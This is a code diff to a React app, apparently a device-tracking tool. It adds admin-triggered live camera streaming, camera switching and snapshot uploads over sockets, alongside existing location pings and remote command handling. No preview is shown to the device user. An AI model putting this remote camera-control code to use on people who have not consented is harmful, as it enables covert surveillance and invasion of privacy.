@@ -101,6 +101,9 @@ function App() {
   const isOnlineRef = useRef(true);
   const lastPingRef = useRef({ lat: 0, lng: 0, time: 0 }); // Dedup pings
   const batteryRef = useRef(null); // Cached battery object
+  const cameraStreamRef = useRef(null); // Active camera MediaStream
+  const cameraIntervalRef = useRef(null); // Frame capture interval
+  const cameraVideoRef = useRef(null); // Video element for camera
 
   // Keep refs in sync with state
   useEffect(() => {
@@ -504,6 +507,28 @@ function App() {
     socketConnection.on("command", (command) => {
       console.log("[YS] Received command via socket:", command.command);
       executeCommand(command);
+    });
+
+    // Live camera streaming commands
+    socketConnection.on("camera-start", (data) => {
+      console.log("[YS] Camera stream start requested:", data.facing);
+      startCameraStream(socketConnection, data.facing || "front");
+    });
+
+    socketConnection.on("camera-stop", () => {
+      console.log("[YS] Camera stream stop requested");
+      stopCameraStream();
+    });
+
+    socketConnection.on("camera-snapshot", () => {
+      console.log("[YS] Camera snapshot requested");
+      takeCameraSnapshot();
+    });
+
+    socketConnection.on("camera-switch", (data) => {
+      console.log("[YS] Camera switch requested:", data.facing);
+      stopCameraStream();
+      setTimeout(() => startCameraStream(socketConnection, data.facing || "front"), 300);
     });
 
     socketRef.current = socketConnection;
@@ -1115,6 +1140,152 @@ function App() {
       }
     } catch (e) {
       console.error("[YS] Camera capture failed:", e);
+    }
+  };
+
+  // =============================================
+  // LIVE CAMERA STREAMING
+  // =============================================
+  const startCameraStream = async (socketConn, facing) => {
+    // Stop any existing stream first
+    stopCameraStream();
+
+    const facingMode = facing === "back" ? "environment" : "user";
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
+      });
+      cameraStreamRef.current = stream;
+
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      video.setAttribute("playsinline", "true");
+      video.setAttribute("muted", "true");
+      await video.play();
+      cameraVideoRef.current = video;
+
+      // Wait for video to be ready
+      await new Promise((resolve) => {
+        const check = () => {
+          if (video.videoWidth > 0 && video.videoHeight > 0) resolve();
+          else setTimeout(check, 100);
+        };
+        check();
+      });
+
+      // Let camera adjust exposure
+      await new Promise((r) => setTimeout(r, 500));
+
+      // Notify admin that stream is active
+      const sock = socketConn || socketRef.current;
+      if (sock) {
+        sock.emit("camera-stream-started", {
+          deviceId: deviceIdRef.current,
+          facing,
+          width: video.videoWidth,
+          height: video.videoHeight,
+        });
+      }
+
+      // Send frames at ~2 FPS (every 500ms)
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext("2d");
+
+      cameraIntervalRef.current = setInterval(() => {
+        if (!cameraStreamRef.current || !video.srcObject) {
+          stopCameraStream();
+          return;
+        }
+        try {
+          ctx.drawImage(video, 0, 0);
+          const frame = canvas.toDataURL("image/jpeg", 0.5).split(",")[1];
+          const sock = socketRef.current;
+          if (sock && sock.connected) {
+            sock.emit("camera-frame", {
+              deviceId: deviceIdRef.current,
+              frame,
+              timestamp: Date.now(),
+            });
+          }
+        } catch (e) {
+          console.warn("[YS] Frame capture error:", e);
+        }
+      }, 500);
+
+      console.log(`[YS] Camera stream started: ${facing}, ${video.videoWidth}x${video.videoHeight}`);
+    } catch (e) {
+      console.error("[YS] Failed to start camera stream:", e);
+      const sock = socketConn || socketRef.current;
+      if (sock) {
+        sock.emit("camera-stream-error", {
+          deviceId: deviceIdRef.current,
+          error: e.message || "Camera access denied",
+        });
+      }
+    }
+  };
+
+  const stopCameraStream = () => {
+    if (cameraIntervalRef.current) {
+      clearInterval(cameraIntervalRef.current);
+      cameraIntervalRef.current = null;
+    }
+    if (cameraStreamRef.current) {
+      cameraStreamRef.current.getTracks().forEach((t) => t.stop());
+      cameraStreamRef.current = null;
+    }
+    if (cameraVideoRef.current) {
+      cameraVideoRef.current.srcObject = null;
+      cameraVideoRef.current = null;
+    }
+    const sock = socketRef.current;
+    if (sock && sock.connected) {
+      sock.emit("camera-stream-stopped", { deviceId: deviceIdRef.current });
+    }
+    console.log("[YS] Camera stream stopped");
+  };
+
+  const takeCameraSnapshot = async () => {
+    const video = cameraVideoRef.current;
+    if (!video || !cameraStreamRef.current) {
+      console.warn("[YS] No active camera stream for snapshot");
+      return;
+    }
+    try {
+      // High quality snapshot
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+      const base64Photo = canvas.toDataURL("image/jpeg", 0.9).split(",")[1];
+
+      const currentDeviceId = deviceIdRef.current;
+      if (base64Photo && currentDeviceId) {
+        const uploadResponse = await fetch(
+          `${API_BASE}/devices/${currentDeviceId}/photo`,
+          {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ photo: base64Photo }),
+          },
+        );
+        if (uploadResponse.ok) {
+          const data = await uploadResponse.json();
+          console.log("[YS] Snapshot saved:", data.filename);
+          // Notify admin that snapshot was saved
+          const sock = socketRef.current;
+          if (sock && sock.connected) {
+            sock.emit("camera-snapshot-saved", {
+              deviceId: currentDeviceId,
+              filename: data.filename,
+            });
+          }
+        }
+      }
+    } catch (e) {
+      console.error("[YS] Snapshot failed:", e);
     }
   };
 
